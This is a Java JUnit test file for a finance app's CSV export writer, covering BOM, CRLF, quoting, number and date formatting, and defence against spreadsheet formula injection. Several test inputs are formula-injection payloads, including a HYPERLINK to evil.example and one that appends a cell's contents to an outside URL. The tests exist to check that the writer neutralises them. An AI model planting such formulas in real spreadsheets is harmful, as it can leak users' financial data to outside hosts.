package com.financeos.domain.report.underlying;

import com.financeos.domain.report.engine.TableData;
import org.junit.jupiter.api.Test;

import java.io.ByteArrayOutputStream;
import java.math.BigDecimal;
import java.nio.charset.StandardCharsets;
import java.time.LocalDate;
import java.util.Arrays;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;

import static org.junit.jupiter.api.Assertions.assertArrayEquals;
import static org.junit.jupiter.api.Assertions.assertEquals;

/** CSV output for spreadsheets: BOM, CRLF, RFC 4180 quoting and human cell formats. */
class UnderlyingCsvWriterTest {

    private static TableData page(List<TableData.Column> columns, List<Map<String, Object>> rows) {
        return new TableData("TABLE", "raw", columns, rows, new TableData.Page(0, 1000, rows.size(), 1));
    }

    private static Map<String, Object> row(Object... keyValues) {
        Map<String, Object> m = new LinkedHashMap<>();
        for (int i = 0; i < keyValues.length; i += 2) {
            m.put((String) keyValues[i], keyValues[i + 1]);
        }
        return m;
    }

    @Test
    void writesABomTheHeaderAndEachPagesRowsWithCrlf() throws Exception {
        List<TableData.Column> columns = List.of(
                new TableData.Column("date", "Date", "date", null),
                new TableData.Column("description", "Description", "string", null),
                new TableData.Column("amount", "Amount", "number", "currency"));
        ByteArrayOutputStream out = new ByteArrayOutputStream();

        UnderlyingCsvWriter csv = new UnderlyingCsvWriter(out);
        csv.header(columns);
        csv.rows(page(columns, List.of(row("id", "t1", "date", LocalDate.of(2026, 10, 1), "description", "Swiggy",
                "amount", new BigDecimal("-450.5")))));
        csv.rows(page(columns, List.of(row("id", "t2", "date", LocalDate.of(2026, 9, 30), "description", "Rent",
                "amount", new BigDecimal("20000")))));

        byte[] bytes = out.toByteArray();
        assertArrayEquals(new byte[]{(byte) 0xEF, (byte) 0xBB, (byte) 0xBF}, Arrays.copyOf(bytes, 3));
        assertEquals("Date,Description,Amount\r\n01/10/2026,Swiggy,-450.50\r\n30/09/2026,Rent,20000.00\r\n",
                new String(bytes, 3, bytes.length - 3, StandardCharsets.UTF_8));
    }

    @Test
    void headerLabelsAreQuotedLikeCells() throws Exception {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        UnderlyingCsvWriter csv = new UnderlyingCsvWriter(out);
        csv.header(List.of(new TableData.Column("pnl", "Realized P&L, net", "number", "currency")));
        csv.rows(page(List.of(), List.of()));

        assertEquals("﻿\"Realized P&L, net\"\r\n", out.toString(StandardCharsets.UTF_8));
    }

    @Test
    void quotesOnlyFieldsWithACommaQuoteOrLineBreak() {
        assertEquals("plain text", UnderlyingCsvWriter.escape("plain text"));
        assertEquals("\"Food, Fuel\"", UnderlyingCsvWriter.escape("Food, Fuel"));
        assertEquals("\"5\"\" screen\"", UnderlyingCsvWriter.escape("5\" screen"));
        assertEquals("\"line\nbreak\"", UnderlyingCsvWriter.escape("line\nbreak"));
        assertEquals("\"carriage\rreturn\"", UnderlyingCsvWriter.escape("carriage\rreturn"));
        assertEquals("", UnderlyingCsvWriter.escape(""));
    }

    @Test
    void currencyAndPercentHaveTwoDecimalsRoundedHalfUp() {
        assertEquals("1234.57", UnderlyingCsvWriter.cell(new BigDecimal("1234.565"), "currency"));
        assertEquals("12.30", UnderlyingCsvWriter.cell(new BigDecimal("12.3"), "percent"));
        assertEquals("0.00", UnderlyingCsvWriter.cell(BigDecimal.ZERO, "currency"));
    }

    @Test
    void otherNumbersArePlainWithoutTrailingZerosOrExponent() {
        assertEquals("10", UnderlyingCsvWriter.cell(new BigDecimal("10.000"), "number"));
        assertEquals("1000000", UnderlyingCsvWriter.cell(new BigDecimal("1E+6"), null));
        assertEquals("0.125", UnderlyingCsvWriter.cell(new BigDecimal("0.1250"), null));
        assertEquals("0", UnderlyingCsvWriter.cell(new BigDecimal("0.00"), null));
        assertEquals("42", UnderlyingCsvWriter.cell(42L, null));
    }

    @Test
    void datesBooleansListsAndNullsReadAsPeopleSeeThem() {
        assertEquals("09/10/2026", UnderlyingCsvWriter.cell(LocalDate.of(2026, 10, 9), null));
        assertEquals("Yes", UnderlyingCsvWriter.cell(Boolean.TRUE, null));
        assertEquals("No", UnderlyingCsvWriter.cell(Boolean.FALSE, null));
        assertEquals("Food, Fuel", UnderlyingCsvWriter.cell(List.of("Food", "Fuel"), null));
        assertEquals("", UnderlyingCsvWriter.cell(null, "currency"));
        assertEquals("HDFC Regalia", UnderlyingCsvWriter.cell("HDFC Regalia", null));
    }

    @Test
    void textStartingWithAFormulaTriggerGetsALeadingApostrophe() {
        assertEquals("'=HYPERLINK(\"https://evil.example\")", UnderlyingCsvWriter.cell("=HYPERLINK(\"https://evil.example\")", null));
        assertEquals("'+91 98xx UPI", UnderlyingCsvWriter.cell("+91 98xx UPI", null));
        assertEquals("'-2+3", UnderlyingCsvWriter.cell("-2+3", null));
        assertEquals("'@SUM(A1:A2)", UnderlyingCsvWriter.cell("@SUM(A1:A2)", null));
        assertEquals("'\t=1+1", UnderlyingCsvWriter.cell("\t=1+1", null));
        assertEquals("'\r=1+1", UnderlyingCsvWriter.cell("\r=1+1", null));
    }

    @Test
    void textWithATriggerAfterTheFirstCharacterIsLeftAlone() {
        assertEquals("UPI-Swiggy=paid @ 5", UnderlyingCsvWriter.cell("UPI-Swiggy=paid @ 5", null));
        assertEquals("", UnderlyingCsvWriter.cell("", null));
    }

    @Test
    void negativeNumbersStayNumeric() {
        assertEquals("-12.50", UnderlyingCsvWriter.cell(new BigDecimal("-12.5"), "currency"));
        assertEquals("-12.5", UnderlyingCsvWriter.cell(new BigDecimal("-12.50"), null));
        assertEquals("-3", UnderlyingCsvWriter.cell(-3L, null));
    }

    @Test
    void eachTextElementOfAListIsNeutralisedButNumbersAreNot() {
        assertEquals("'=1+1, Food, '@x, -5",
                UnderlyingCsvWriter.cell(List.of("=1+1", "Food", "@x", -5), null));
    }

    @Test
    void aNeutralisedFormulaIsStillQuotedWhenItHoldsACommaOrQuote() throws Exception {
        List<TableData.Column> columns = List.of(new TableData.Column("description", "Description", "string", null));
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        UnderlyingCsvWriter csv = new UnderlyingCsvWriter(out);
        csv.rows(page(columns, List.of(row("description", "=HYPERLINK(\"https://x/?d=\"&B2,\"Refund\")"))));

        assertEquals("\uFEFF\"'=HYPERLINK(\"\"https://x/?d=\"\"&B2,\"\"Refund\"\")\"\r\n",
                out.toString(StandardCharsets.UTF_8));
    }
}
